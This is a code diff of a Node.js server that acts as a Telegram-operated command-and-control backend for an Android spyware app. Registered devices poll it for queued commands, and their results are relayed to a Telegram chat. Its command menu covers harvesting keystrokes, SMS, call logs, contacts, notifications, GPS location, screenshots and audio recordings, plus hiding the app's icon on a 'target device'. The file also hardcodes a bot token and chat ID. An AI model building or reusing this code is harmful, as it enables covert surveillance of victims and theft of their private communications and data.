@@ -8,332 +8,90 @@ const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGR
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 // Store authorized devices and their commands
-// Format: devices.set(deviceId, { chatId, lastSeen, pendingCommands, deviceInfo })
 const devices = new Map();
 
-// Store authorized chat IDs (you can add multiple)
+// Store authorized chat IDs
 const authorizedChats = new Set([
-    '5326373447', // Your chat ID from the logs
-    // Add more chat IDs here if needed
+    '5326373447', // Your chat ID
 ]);
 
 // Middleware
 app.use(express.json());
 
-// Verify if the request is from an authorized chat
+// ============= HELPER FUNCTIONS =============
+
 function isAuthorizedChat(chatId) {
     return authorizedChats.has(String(chatId));
 }
 
-// Webhook endpoint for Telegram
-app.post('/webhook', async (req, res) => {
-    const update = req.body;
-    console.log('📩 Received update:', JSON.stringify(update, null, 2));
-
-    if (update.message) {
-        const chatId = update.message.chat.id;
-        const text = update.message.text;
-        const messageId = update.message.message_id;
-
-        // Check if this chat is authorized
-        if (!isAuthorizedChat(chatId)) {
-            console.log(`⛔ Unauthorized access attempt from chat: ${chatId}`);
-            await sendTelegramMessage(chatId, 
-                '⛔ You are not authorized to use this bot. Please contact the administrator.');
-            return res.sendStatus(200);
-        }
-
-        // Handle commands
-        if (text && text.startsWith('/')) {
-            await handleCommand(chatId, text, messageId);
-        }
-    }
-
-    res.sendStatus(200);
-});
-// Add this helper function to ensure valid JSON responses
 function sendJsonResponse(res, data, statusCode = 200) {
     try {
-        // Ensure we're sending valid JSON
-        const jsonString = JSON.stringify(data);
-        res.status(statusCode).setHeader('Content-Type', 'application/json').send(jsonString);
+        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
     } catch (e) {
         console.error('Error stringifying JSON:', e);
-        res.status(500).json({ error: 'Internal server error', message: e.message });
+        res.status(500).json({ error: 'Internal server error' });
     }
 }
 
-// Endpoint for devices to check pending commands
-app.get('/api/commands/:deviceId', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const device = devices.get(deviceId);
-    
+// ============= TELEGRAM MESSAGE HELPERS =============
+
+async function sendTelegramMessage(chatId, text) {
     try {
-        if (device && device.pendingCommands && device.pendingCommands.length > 0) {
-            const commands = [...device.pendingCommands];
-            device.pendingCommands = [];
-            console.log(`📤 Sending ${commands.length} command(s) to device ${deviceId}`);
-            sendJsonResponse(res, { commands });
-        } else {
-            sendJsonResponse(res, { commands: [] });
+        if (!text || text.trim().length === 0) {
+            console.error('❌ Attempted to send empty message');
+            return null;
         }
-    } catch (e) {
-        console.error('Error in /api/commands:', e);
-        sendJsonResponse(res, { commands: [], error: e.message }, 500);
-    }
-});
 
-
-// Endpoint for devices to report command results
-app.post('/api/result/:deviceId', async (req, res) => {
-    const deviceId = req.params.deviceId;
-    const { command, result, error } = req.body;
-    
-    console.log(`📨 Result from device ${deviceId}:`, { command, result, error });
-    
-    const device = devices.get(deviceId);
-    if (device) {
-        const chatId = device.chatId;
-        const message = error 
-            ? `❌ *Command Failed*\n\n${command}\n\nError: ${error}`
-            : `✅ *Command Executed*\n\n${command}\n\nResult:\n${result}`;
+        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
         
-        await sendTelegramMessage(chatId, message);
-        console.log(`📨 Result sent to Telegram chat ${chatId}`);
-    }
-    
-    res.sendStatus(200);
-});
-
-// Endpoint for devices to register
-app.post('/api/register', async (req, res) => {
-    const { deviceId, chatId, deviceInfo } = req.body;
-    
-    console.log('📝 Registration attempt:', { deviceId, chatId, deviceInfo });
-    
-    // Validate required fields
-    if (!deviceId || !chatId || !deviceInfo) {
-        console.log('❌ Missing required fields');
-        return res.status(400).json({ 
-            status: 'error', 
-            message: 'Missing required fields. Need deviceId, chatId, and deviceInfo' 
-        });
-    }
-    
-    // Verify the chatId is authorized
-    if (!isAuthorizedChat(chatId)) {
-        console.log(`⛔ Unauthorized registration attempt from chat: ${chatId}`);
-        console.log('✅ Authorized chats are:', Array.from(authorizedChats));
-        return res.status(403).json({ 
-            status: 'unauthorized', 
-            message: 'Chat ID not authorized',
-            authorizedChats: Array.from(authorizedChats)
-        });
-    }
-    
-    // Store device information
-    devices.set(deviceId, {
-        chatId,
-        deviceInfo,
-        lastSeen: Date.now(),
-        pendingCommands: []
-    });
-    
-    console.log(`✅ Device registered successfully!`);
-    console.log(`   - Device ID: ${deviceId}`);
-    console.log(`   - Chat ID: ${chatId}`);
-    console.log(`   - Device Info:`, deviceInfo);
-    console.log(`   - Total devices now: ${devices.size}`);
-    
-    // Send confirmation to Telegram
-    await sendTelegramMessage(chatId, 
-        `✅ *Device Connected Successfully!*\n\n` +
-        `📱 *Device Details:*\n` +
-        `Model: ${deviceInfo.model || 'Unknown'}\n` +
-        `Android: ${deviceInfo.android || 'Unknown'}\n` +
-        `Battery: ${deviceInfo.battery || 'Unknown'}\n` +
-        `ID: ${deviceId.substring(0, 8)}...\n\n` +
-        `🎯 *Available Commands:*\n` +
-        `/status - Get device status\n` +
-        `/screenshot - Take screenshot\n` +
-        `/location - Get GPS location\n` +
-        `/contacts - Get contacts\n` +
-        `/help - Show this menu`);
-    
-    res.json({ status: 'registered', deviceId: deviceId });
-});
-
-// Endpoint to list all registered devices
-app.get('/api/devices', (req, res) => {
-    const deviceList = [];
-    for (const [id, device] of devices.entries()) {
-        deviceList.push({
-            deviceId: id,
-            chatId: device.chatId,
-            lastSeen: new Date(device.lastSeen).toISOString(),
-            model: device.deviceInfo?.model || 'Unknown',
-            android: device.deviceInfo?.android || 'Unknown'
-        });
-    }
-    res.json({ 
-        total: devices.size,
-        devices: deviceList 
-    });
-});
-
-// Debug endpoint to check a specific device
-app.get('/api/debug/:deviceId', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const device = devices.get(deviceId);
-    
-    if (device) {
-        res.json({
-            deviceId: deviceId,
-            chatId: device.chatId,
-            deviceInfo: device.deviceInfo,
-            lastSeen: new Date(device.lastSeen).toISOString(),
-            pendingCommands: device.pendingCommands || [],
-            pendingCount: device.pendingCommands?.length || 0
-        });
-    } else {
-        res.json({ 
-            error: 'Device not found',
-            deviceId: deviceId,
-            registeredDevices: Array.from(devices.keys())
-        });
-    }
-});
-
-// Test endpoint
-app.post('/api/test/:deviceId', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const device = devices.get(deviceId);
-    
-    if (device) {
-        console.log(`🔔 Test ping received for device ${deviceId}`);
-        device.lastSeen = Date.now();
-        res.json({ status: 'ok', deviceFound: true });
-    } else {
-        console.log(`🔔 Test ping received for unknown device ${deviceId}`);
-        res.json({ status: 'ok', deviceFound: false });
-    }
-});
-
-// Health check endpoint
-app.get('/health', (req, res) => {
-    res.json({ 
-        status: 'healthy', 
-        devices: devices.size,
-        authorizedChats: authorizedChats.size,
-        timestamp: Date.now()
-    });
-});
-
-async function handleCommand(chatId, command, messageId) {
-    console.log(`🎯 Handling command ${command} from authorized chat ${chatId}`);
-    console.log(`📊 Current devices in memory: ${devices.size}`);
-    
-    // SPECIAL HANDLE HELP IMMEDIATELY - BEFORE ANY DEVICE CHECK
-   if (command === '/help' || command === '/start') {
-    console.log('📋 HELP COMMAND DETECTED');
-    
-    // Send a simple test message first
-    try {
-        // Send simple message to verify connection
-        await axios.post(`${TELEGRAM_API}/sendMessage`, {
+        // Use HTML parse_mode which is more forgiving
+        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: chatId,
-            text: '🤖 Processing your request...'
+            text: text,
+            parse_mode: 'HTML'
         });
         
-        // Then send the full help message
-        const helpText = getHelpMessage();
-        await sendTelegramMessage(chatId, helpText);
-        
-        console.log('✅ Help messages sent successfully');
+        console.log(`✅ Message sent successfully to ${chatId}`);
+        return response.data;
     } catch (error) {
-        console.error('❌ Failed to send help:', error.response?.data || error.message);
+        console.error('❌ Error sending message:', error.response?.data || error.message);
+        
+        // If HTML fails, try without formatting
+        if (error.response?.status === 400) {
+            console.log('⚠️ HTML failed, retrying as plain text');
+            try {
+                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
+                    chat_id: chatId,
+                    text: text.replace(/<[^>]*>/g, '') // Strip HTML tags
+                });
+                return response.data;
+            } catch (e) {
+                console.error('❌ Plain text also failed:', e.response?.data || e.message);
+            }
+        }
+        return null;
     }
-    
-    return;
 }
 
-    // Log all registered devices for debugging
-    if (devices.size > 0) {
-        console.log('Registered devices:');
-        for (const [id, device] of devices.entries()) {
-            console.log(`   - Device ${id} -> Chat ${device.chatId}`);
-        }
-    } else {
-        console.log('⚠️ No devices registered');
-    }
+// ============= COMMAND HELPERS =============
 
-    // Find device for this chat
-    let deviceId = null;
-    let device = null;
-    
-    for (const [id, d] of devices.entries()) {
-        if (String(d.chatId) === String(chatId)) {
-            deviceId = id;
-            device = d;
-            console.log(`✅ Found matching device: ${id}`);
-            break;
-        }
-    }
-
-    if (!deviceId) {
-        console.log(`❌ No device found for chat ${chatId}`);
-        await sendTelegramMessage(chatId, 
-            '❌ No device registered for this chat.\n\n' +
-            'Please make sure the Android app is running on your target device.\n' +
-            'Current registered chats: ' + (Array.from(devices.values()).map(d => d.chatId).join(', ') || 'none'));
-        return;
-    }
-
-    // Update last seen
-    device.lastSeen = Date.now();
-
-    // For all other commands, add to device's pending queue
-    if (!device.pendingCommands) {
-        device.pendingCommands = [];
-    }
-    
-    // Remove the leading slash for the app
-    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
-    
-    const commandObject = {
-        command: cleanCommand, // Send without slash
-        originalCommand: command, // Keep original for logging
-        messageId: messageId,
-        timestamp: Date.now()
-    };
-    
-    device.pendingCommands.push(commandObject);
-    console.log(`📝 Command added to queue for device ${deviceId}:`, commandObject);
-    console.log(`📊 Pending commands now: ${device.pendingCommands.length}`);
-
-    // Acknowledge command receipt
-    await sendTelegramMessage(chatId, `⏳ Processing: ${command}`);
-}
-
-
-// Help message with all commands
 function getHelpMessage() {
-    return `📋 *Complete Command List*
+    return `<b>🤖 COMPLETE COMMAND LIST</b>
 
-*🔍 Monitoring Commands*
+<b>🔍 MONITORING COMMANDS</b>
 /status - Get full device status
 /location - Get current GPS location
 /battery - Get battery level only
 /storage - Get storage information
 /network - Get network info (IP, WiFi, Mobile)
 
-*📸 Media Commands*
+<b>📸 MEDIA COMMANDS</b>
 /screenshot - Take a screenshot NOW
 /record - Start 60s audio recording NOW
 /stream_start - Start live streaming
 /stream_stop - Stop live streaming
 
-*📱 Data Extraction Commands*
+<b>📱 DATA EXTRACTION COMMANDS</b>
 /contacts - Get contact list
 /calllogs - Get recent call logs
 /sms - Get recent SMS messages
@@ -341,7 +99,7 @@ function getHelpMessage() {
 /keystrokes - Get recent keystrokes
 /notifications - Get recent notifications
 
-*⚙️ Service Control Commands*
+<b>⚙️ SERVICE CONTROL COMMANDS</b>
 /start_screenshot - Start screenshot SERVICE (continuous)
 /stop_screenshot - Stop screenshot service
 /start_recording - Start scheduled recording SERVICE
@@ -349,23 +107,23 @@ function getHelpMessage() {
 /start_stream - Start streaming service
 /stop_stream - Stop streaming service
 
-*🛠️ Utility Commands*
+<b>🛠️ UTILITY COMMANDS</b>
 /ping - Test connection
 /time - Get device time
 /info - Get detailed device info
 
-*📊 Stats Commands*
+<b>📊 STATS COMMANDS</b>
 /logs_count - Get total log count
 /logs_recent - Get 10 most recent logs
 /stats - Get detailed statistics
 
-*⚠️ Danger Commands*
+<b>⚠️ DANGER COMMANDS</b>
 /clear_logs - Clear all logs
 /reboot_app - Restart all services
 /hide_icon - Hide launcher icon
 /show_icon - Show launcher icon
 
-*📋 Quick Reference*
+<b>📋 QUICK REFERENCE</b>
 • Just /record - Quick 60s recording
 • Just /screenshot - Quick screenshot
 • /start_recording - Enable continuous scheduled recording
@@ -377,113 +135,270 @@ function getHelpMessage() {
 For more help, visit the dashboard at http://127.0.0.1:8080`;
 }
 
-// Helper to send Telegram messages
-async function sendTelegramMessage(chatId, text) {
-    try {
-        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
-        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
-            chat_id: chatId,
-            text: text,
-            parse_mode: 'Markdown'
-        });
-        console.log(`📨 Message sent to ${chatId}:`, response.data.ok);
-        return response.data;
-    } catch (error) {
-        console.error('❌ Error sending message:', error.response?.data || error.message);
-        throw error;
+// ============= WEBHOOK ENDPOINT =============
+
+app.post('/webhook', async (req, res) => {
+    // Send 200 OK immediately
+    res.sendStatus(200);
+    
+    // Process asynchronously
+    setImmediate(async () => {
+        try {
+            const update = req.body;
+            console.log('📩 Received update:', JSON.stringify(update, null, 2));
+
+            if (!update?.message) {
+                console.log('📭 Non-message update');
+                return;
+            }
+
+            const chatId = update.message.chat.id;
+            const text = update.message.text;
+            const messageId = update.message.message_id;
+
+            // Check authorization
+            if (!isAuthorizedChat(chatId)) {
+                console.log(`⛔ Unauthorized chat: ${chatId}`);
+                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
+                return;
+            }
+
+            // Handle commands
+            if (text?.startsWith('/')) {
+                await handleCommand(chatId, text, messageId);
+            }
+        } catch (error) {
+            console.error('❌ Error processing webhook:', error);
+        }
+    });
+});
+
+// ============= COMMAND HANDLER =============
+
+async function handleCommand(chatId, command, messageId) {
+    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
+    console.log(`📊 Devices in memory: ${devices.size}`);
+
+    // Handle help immediately - no device needed
+    if (command === '/help' || command === '/start') {
+        console.log('📋 Sending help menu directly from server');
+        const helpMessage = getHelpMessage();
+        await sendTelegramMessage(chatId, helpMessage);
+        console.log('✅ Help menu sent');
+        return;
     }
+
+    // Find device for this chat
+    let deviceId = null;
+    let device = null;
+    
+    for (const [id, d] of devices.entries()) {
+        if (String(d.chatId) === String(chatId)) {
+            deviceId = id;
+            device = d;
+            console.log(`✅ Found device: ${deviceId}`);
+            break;
+        }
+    }
+
+    if (!deviceId) {
+        console.log(`❌ No device found for chat ${chatId}`);
+        await sendTelegramMessage(chatId, 
+            '❌ No device registered.\n\nPlease make sure the Android app is running.');
+        return;
+    }
+
+    // Update last seen
+    device.lastSeen = Date.now();
+
+    // Queue command for device (remove leading slash)
+    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
+    
+    if (!device.pendingCommands) {
+        device.pendingCommands = [];
+    }
+    
+    const commandObject = {
+        command: cleanCommand,
+        originalCommand: command,
+        messageId: messageId,
+        timestamp: Date.now()
+    };
+    
+    device.pendingCommands.push(commandObject);
+    console.log(`📝 Command queued:`, commandObject);
+    console.log(`📊 Pending commands: ${device.pendingCommands.length}`);
+
+    // Acknowledge
+    await sendTelegramMessage(chatId, `⏳ Processing: ${command}`);
 }
 
-// Helper to send photo
-async function sendTelegramPhoto(chatId, photoBuffer, caption) {
-    try {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', photoBuffer, 'screenshot.jpg');
-        formData.append('caption', caption);
-        
-        const response = await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
-            headers: { 'Content-Type': 'multipart/form-data' }
-        });
-        console.log(`📸 Photo sent to ${chatId}`);
-        return response.data;
-    } catch (error) {
-        console.error('❌ Error sending photo:', error.response?.data || error.message);
-        throw error;
-    }
-}
+// ============= API ENDPOINTS =============
 
-// Helper to send document
-async function sendTelegramDocument(chatId, documentBuffer, filename, caption) {
-    try {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('document', documentBuffer, filename);
-        formData.append('caption', caption);
-        
-        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
-            headers: { 'Content-Type': 'multipart/form-data' }
-        });
-        console.log(`📎 Document sent to ${chatId}`);
-        return response.data;
-    } catch (error) {
-        console.error('❌ Error sending document:', error.response?.data || error.message);
-        throw error;
-    }
-}
-// Add this endpoint to your server.js
+// Health check
+app.get('/health', (req, res) => {
+    res.json({ 
+        status: 'healthy', 
+        devices: devices.size,
+        authorizedChats: authorizedChats.size,
+        timestamp: Date.now()
+    });
+});
+
+// Ping endpoint for keep-alive
 app.get('/api/ping/:deviceId', (req, res) => {
     const deviceId = req.params.deviceId;
-    console.log(`💓 Received keep-alive ping from device ${deviceId}`);
+    console.log(`💓 Ping from device ${deviceId}`);
     
     const device = devices.get(deviceId);
     
     if (device) {
         device.lastSeen = Date.now();
-        res.json({ 
-            status: 'alive', 
-            timestamp: Date.now(),
-            deviceId: deviceId 
-        });
+        res.json({ status: 'alive', timestamp: Date.now() });
     } else {
-        console.log(`⚠️ Ping from unknown device: ${deviceId}`);
-        res.status(404).json({ 
-            status: 'unknown', 
-            message: 'Device not registered' 
-        });
+        res.status(404).json({ status: 'unknown' });
     }
 });
+
+// Get pending commands for device
+app.get('/api/commands/:deviceId', (req, res) => {
+    const deviceId = req.params.deviceId;
+    const device = devices.get(deviceId);
+    
+    try {
+        if (device?.pendingCommands?.length > 0) {
+            const commands = [...device.pendingCommands];
+            device.pendingCommands = [];
+            console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
+            sendJsonResponse(res, { commands });
+        } else {
+            sendJsonResponse(res, { commands: [] });
+        }
+    } catch (e) {
+        console.error('Error in /api/commands:', e);
+        sendJsonResponse(res, { commands: [], error: e.message }, 500);
+    }
+});
+
+// Receive command result from device
+app.post('/api/result/:deviceId', async (req, res) => {
+    const deviceId = req.params.deviceId;
+    const { command, result, error } = req.body;
+    
+    console.log(`📨 Result from ${deviceId}:`, { command, result, error });
+    
+    const device = devices.get(deviceId);
+    if (device) {
+        const chatId = device.chatId;
+        const message = error 
+            ? `❌ <b>Command Failed</b>\n\n${command}\n\nError: ${error}`
+            : `✅ <b>Command Executed</b>\n\n${command}\n\nResult:\n${result}`;
+        
+        await sendTelegramMessage(chatId, message);
+    }
+    
+    res.sendStatus(200);
+});
+
+// Register device
+app.post('/api/register', async (req, res) => {
+    const { deviceId, chatId, deviceInfo } = req.body;
+    
+    console.log('📝 Registration attempt:', { deviceId, chatId, deviceInfo });
+    
+    if (!deviceId || !chatId || !deviceInfo) {
+        return res.status(400).json({ error: 'Missing fields' });
+    }
+    
+    if (!isAuthorizedChat(chatId)) {
+        console.log(`⛔ Unauthorized registration from chat: ${chatId}`);
+        return res.status(403).json({ error: 'Chat ID not authorized' });
+    }
+    
+    const deviceData = {
+        chatId,
+        deviceInfo,
+        lastSeen: Date.now(),
+        pendingCommands: []
+    };
+    
+    devices.set(deviceId, deviceData);
+    
+    console.log(`✅ Device registered: ${deviceId} for chat ${chatId}`);
+    console.log(`📊 Total devices: ${devices.size}`);
+    
+    // Send confirmation
+    await sendTelegramMessage(chatId, 
+        `✅ <b>Device Connected!</b>\n\n` +
+        `Model: ${deviceInfo.model}\n` +
+        `Android: ${deviceInfo.android}\n` +
+        `Battery: ${deviceInfo.battery}\n` +
+        `ID: ${deviceId.substring(0, 8)}...`);
+    
+    res.json({ status: 'registered', deviceId });
+});
+
+// List all devices
+app.get('/api/devices', (req, res) => {
+    const deviceList = [];
+    for (const [id, device] of devices.entries()) {
+        deviceList.push({
+            deviceId: id,
+            chatId: device.chatId,
+            lastSeen: new Date(device.lastSeen).toISOString(),
+            model: device.deviceInfo?.model || 'Unknown',
+            android: device.deviceInfo?.android || 'Unknown'
+        });
+    }
+    res.json({ total: devices.size, devices: deviceList });
+});
+
+// Debug endpoint
+app.get('/api/debug/:deviceId', (req, res) => {
+    const deviceId = req.params.deviceId;
+    const device = devices.get(deviceId);
+    
+    if (device) {
+        res.json({
+            deviceId,
+            chatId: device.chatId,
+            deviceInfo: device.deviceInfo,
+            lastSeen: new Date(device.lastSeen).toISOString(),
+            pendingCommands: device.pendingCommands || []
+        });
+    } else {
+        res.json({ error: 'Device not found' });
+    }
+});
+
+// Test endpoints
 app.get('/test', (req, res) => {
     res.send(`
         <html>
         <body>
-            <h1>Server is Alive!</h1>
+            <h1>✅ Server Running</h1>
             <p>Time: ${new Date().toISOString()}</p>
             <p>Devices: ${devices.size}</p>
             <p>Authorized Chats: ${Array.from(authorizedChats).join(', ')}</p>
+            <p><a href="/test-help">Send Test Help</a></p>
         </body>
         </html>
     `);
 });
 
 app.get('/test-help', async (req, res) => {
-    const chatId = '5326373447'; // Your chat ID
+    const chatId = '5326373447';
     const helpMessage = getHelpMessage();
-    
-    try {
-        await sendTelegramMessage(chatId, helpMessage);
-        res.json({ success: true, message: 'Help sent to your Telegram' });
-    } catch (error) {
-        res.json({ success: false, error: error.message });
-    }
+    const result = await sendTelegramMessage(chatId, helpMessage);
+    res.json({ success: !!result, result });
 });
 
+// ============= START SERVER =============
 
-// Start server
 app.listen(PORT, () => {
-    console.log('🚀 ==================================');
-    console.log(`🚀 Webhook server running on port ${PORT}`);
+    console.log('\n🚀 ==================================');
+    console.log(`🚀 Server running on port ${PORT}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
-    console.log('🚀 ==================================');
+    console.log('🚀 ==================================\n');
 });
